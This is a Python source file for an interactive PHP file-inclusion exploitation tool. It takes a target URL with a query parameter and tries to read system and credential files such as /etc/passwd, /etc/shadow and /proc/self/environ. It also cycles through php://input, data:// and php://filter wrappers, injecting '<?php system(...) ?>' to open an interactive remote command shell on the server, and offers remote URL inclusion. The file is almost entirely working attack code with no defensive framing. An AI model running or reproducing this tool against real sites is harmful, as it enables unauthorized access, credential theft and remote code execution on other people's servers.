import requests
import base64
import sys


class Include(object):


  def __init__(self,url,cookies):
    self.url = url
    self.cookies = cookies

  def include(self):
    self.Test()

  def Test(self):
    if "?" not in self.url or "=" not in self.url:
      sys.exit("wrong input url,please use url end with like ?id=1 param")
    index = self.url.find("=")
    self.url = self.url[:index+1]
    print("Exploit with payloads")
    print(self.url)
    print("test with local file include")
    self.local()
    self.fake_protocol()
    sys.exit()



  def local(self):
    payload = ["/etc/issue","/etc/passwd","/etc/shadow","/etc/group","/etc/hosts",
        "/etc/motd","/etc/mysql/my.cnf","/proc/self/environ","/proc/[0-9]*/fd/[0-9]*",
        "/proc/self/environ","/proc/version","/proc/cmdline"]

    count = 0
    for each in payload:
      rep = requests.get(self.url+each,cookies=self.cookies)
      if rep.ok:
        text = rep.text.split("<!DOC")[0].strip()
        if text != '':
          print("payload valid: \033[1;32m%s\033[0m" % each)
          count += 1

    if not count:
      print("Not valid payload find")



  def fake_protocol(self):

    fake_protocol = {}

    self.php_input = "php://input"
    self.php_filter = "php://filter/read=convert.base64-encode/resource="
    self.data = "data://text/plain,<?php phpinfo(); ?>"
    self.data_base64 = "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo="
    self.file_protocol = "file:///"
    self.http_protocol = "http://"
    self.zipfile = "zip:// only work in big than 5.3.0 php version"
    self.bzip2file = "compress.bzip2://"

    protocol = ['php_input','php_filter','data','data_base64','file_protocol',\
        'http_protocol','zipfile','bzip2file','url']

    fake_protocol['php_input'] = self.php_input
    fake_protocol['php_filter'] = self.php_filter
    fake_protocol['data'] = self.data
    fake_protocol['data_base64'] = self.data_base64
    fake_protocol['file_protocol'] = self.file_protocol
    fake_protocol['http_protocol'] = self.http_protocol
    fake_protocol['zipfile'] = self.zipfile
    fake_protocol['bzip2file'] = self.bzip2file
    fake_protocol['url'] = "useing nothing only try with my url %s " % self.url


    for key,value in enumerate(fake_protocol.items()):
      print(key,"\033[1;33m"+value[0]+":\033[0m \033[1;34m"+value[1]+"\033[0m")

    print("press q to quit")
    while True:
      which = input("\033[1;32mwhich protocol you want to use?:\033[0m")
      if which.isdigit():
        if int(which) < len(protocol) and int(which) >= 0:

          if protocol[int(which)] == "php_input":
            self.PHP_INPUT()
          elif protocol[int(which)] == "php_filter":
            self.PHP_FILTER()
          elif protocol[int(which)] == "data":
            self.DATA()
          elif protocol[int(which)] == "data_base64":
            self.DATA_BASE64()
          elif protocol[int(which)] == "file_protocol":
            self.FILE_PROTOCOL()
          elif protocol[int(which)] == "http_protocol":
            self.HTTP_PROTOCOL()
          elif protocol[int(which)] == "zipfile":
            self.ZIPFILE()
          elif protocol[int(which)] == "bzip2file":
            self.BZIP2FILE()
          elif protocol[int(which)] == 'url':
            self.TRY_URL()

      elif which == 'q' or which == 'exit' or which == 'Q':
        sys.exit()


  def PHP_INPUT(self):
    print("test the php://input if valid")
    param = self.url.split("?")[-1].split("=")[0]
    data = param+"="+"<?php phpinfo(); ?>"
    rep = requests.post(self.url+self.php_input,cookies=self.cookies,data=data)
    if param+"="+"php://input" in rep.text:
      print("\033[1;32mValid\033[0m")
      print("prepare a shell")
      while True:
        code = input("\033[1;32mshell:\033[0m")
        if code == 'exit':
          break
        data = param+"="+"<?php system("+code+"); ?>"
        rep = requests.post(self.url + self.php_input,cookies=self.cookies,data=data)
        if not rep.ok:
          break
        print(rep.text.split("<!DOC")[0].strip().split("=")[-1])

    else:
      print("Not work  %s with php://input" % self.url)

    self.fake_protocol()



  def PHP_FILTER(self):
    filetoread = input("\033[1;31minput you want to read of that file:\033[0m")
    rep = requests.get(self.url+self.php_filter+filetoread,cookies=self.cookies)
    b64 = rep.text.split("<!DOC")[0].strip()
    print("\033[1;32mget out put\033[0m")
    print(b64)
    y = input("\033[1;31myou want to decode? y or n:\033[0m")
    if y in 'yYyesYesYES':
      print("\033[1;32mdecode base64\033[0m")
      print(base64.b64decode(b64).decode("ascii"))

    self.fake_protocol()


  def DATA(self):
    print("Check data://text/plain if is valid")
    rep = requests.get(self.url+self.data,cookies=self.cookies)
    check = self.url.split("?")[-1]+self.data.split(",")[0]
    if check in rep.text:
      print("\033[1;32mValid\033[0m with %s" % self.data)
      print("prepare a shell")
      while True:
        code = input("\033[1;32mshell:\033[0m")
        if code == 'exit':
          break
        param = self.data.split(",")[0] +","+"<?php system("+code+"); ?>"
        rep = requests.get(self.url+param,cookies=self.cookies)
        if not rep.ok:
          break
        print(rep.text.split("<!DOC")[0].strip())
    else:
      print("\033[1;31mNot work with \033[0m%s" % self.data)

    self.fake_protocol()


  def DATA_BASE64(self):
    print("Check with the %s " % self.data_base64)
    rep = requests.get(self.url+self.data_base64,cookies=self.cookies)
    if self.data_base64 in rep.text:
      print("\033[1;32mprepare a shell\033[0m")
      while True:
        code = input("\033[1;32mshell:\033[0m")
        code = "<?php system('"+code+"'); ?>"
        code = code.encode('ascii')
        code = base64.b64encode(code)
        code = code.decode('ascii')
        code = self.data_base64.split(",")[0] +","+code
        rep = requests.get(self.url+code,cookies=self.cookies)
        if rep.ok:
          print(rep.text.split("<!DOC")[0].strip())
        else:
          break
    else:
      print("\033[1;31mNot work wit\033[0m %s" % self.data_base64)

    self.fake_protocol()

  def FILE_PROTOCOL(self):
    while True:
      print("target local file to input")
      file_protocol = input("\033[1;31mstart with dir/file/file.*:\033[0m")
      if file_protocol == 'exit':
        print("want to brute file dir? coming soon")
        break
      rep = requests.get(self.url+self.file_protocol+file_protocol,cookies=self.cookies)
      if rep.ok:
        print("request url %s"%self.url+self.file_protocol+file_protocol)
        print(rep.text.split("<!DOC")[0].strip())

    self.fake_protocol()

  def HTTP_PROTOCOL(self):
    while True:
      Type = ["GET","POST","quit"]
      print("POST or GET?")
      for x,i in enumerate(Type,start=0):
        print(x,i)
      choice = input(":")
      if choice.isdigit():
        if int(choice) < 2:
          Type = Type[int(choice)]
        else:
          break

      if Type == 'GET':
        remote = input("\033[1;31minput you remote address url:\033[0m")
        rep = requests.get(self.url+remote,cookies=self.cookies)
        print("request url %s" % self.url+remote)
        if rep.ok:
          print(rep.text)
          print("\033[1;32mGot requet\033[0m ")
      elif Type == 'POST':
        param = input("\033[1;31minput you post data param name and value split with [:]\033[0m")
        key = param.split(":")[0]
        value = param.split(":")[1]
        data = {key:value}
        remote = input("\033[1;31minput you remote address url:\033[0m")
        rep = requests.post(self.url+remote,cookies=self.cookies,data=data)
        if rep.ok:
          print(rep.text.split("<!DOC")[0].strip())

    self.fake_protocol()

  def ZIPFILE(self):
    zipfile = input("\033[1;31mzip file you want to link withed:\033[0m")
    url = self.url+self.zipfile+zipfile
    print("\033[1;31mRequest url\033[0m %s " % url)
    rep = requests.get(url,cookies=self.cookies)
    if rep.ok:
      print(rep.text.split("<!DOC")[0].strip())

    self.fake_protocol()

  def BZIP2FILE(self):
    bzip2file = input("\033[1;31mbzip2file you want to link withed:\033[0m")
    url = self.url+self.bzip2file+bzip2file
    print("\033[1;31mRequest url\033[0m %s" % url)
    rep = requests.get(url,cookies=self.cookies)
    if rep.ok:
      print(rep.text.split("<!DOC")[0].strip())

    self.fake_protocol()

  def TRY_URL(self):
    while True:
      print("\033[1;31mYou url \033[0m%s " % self.url)
      print("\033[1;31mq to quit\033[0m")
      trY = input("\033[1;31mtry with my url:\033[0m")
      print("\033[1;31mRequest url %s\033[0m" % self.url+trY)
      rep = requests.get(self.url+trY,cookies=self.cookies)
      if trY == 'q':
        break
      if rep.ok:
        print(rep.text)

    self.fake_protocol()

